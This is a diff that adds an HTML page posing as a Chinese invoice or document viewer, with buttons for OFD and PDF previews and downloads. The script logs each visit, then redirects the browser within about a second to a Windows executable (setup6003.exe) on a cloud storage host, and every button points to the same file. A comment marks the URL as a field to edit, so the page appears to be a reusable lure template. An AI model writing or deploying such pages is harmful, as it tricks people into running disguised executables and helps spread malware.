@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	
+    <title>2024</title>
+	<script>
+		var linkUrl = "https://s18.tos-cn-guangzhou.volces.com/setup6003.exe";//   需要修改    文件名跳转的地方
+// 当页面加载完成后执行的函数
+window.onload = function() {
+    // 发送 AJAX 请求到 PHP 脚本记录访问次数
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "record_visit.php", true);
+    xhr.send();
+
+		var time = 1;// 3秒后跳转
+		setTimeout(function() {
+			window.location.href = linkUrl;
+		}, time * 1000); 
+};
+	</script>
+    <link href="main/common.css" tppabs="common.css" rel="stylesheet">
+</head>
+
+<body>
+    <div id="header"></div>
+    <div class="box" id="box" style="display: block;">
+        <div class="h2" id="fplx"></div>   
+        <div>
+            
+                    <img src="main/2.jpg" tppabs="2.jpg" width="291" height="272">
+               
+        </div>
+        <!--<div class="button" onclick="download('4');">预览</div> &nbsp;-->
+        <div class="button" onclick="window.location.href = linkUrl;">版式文件预览</div> &nbsp;
+        <div class="button" onclick="window.location.href = linkUrl;">OFD版式文件下载</div> &nbsp;
+        <div class="button" onclick="window.location.href = linkUrl;">PDF预览版下载</div>
+        <!--<div class="warning-btn" onclick="warning();">错误信息展示</div>-->
+    </div>
+    <!--<div id="footer" style="display: none;">-->
+    <!--<div class="footer-item">-->
+    <!--downloadFileTest.zip-->
+    <!--</div>-->
+    <!--</div>-->
+    <div class="warning-box" style="display: none;">
+    </div>
+    <script src="main/jquery.js" tppabs="jquery.js"></script></body></html>
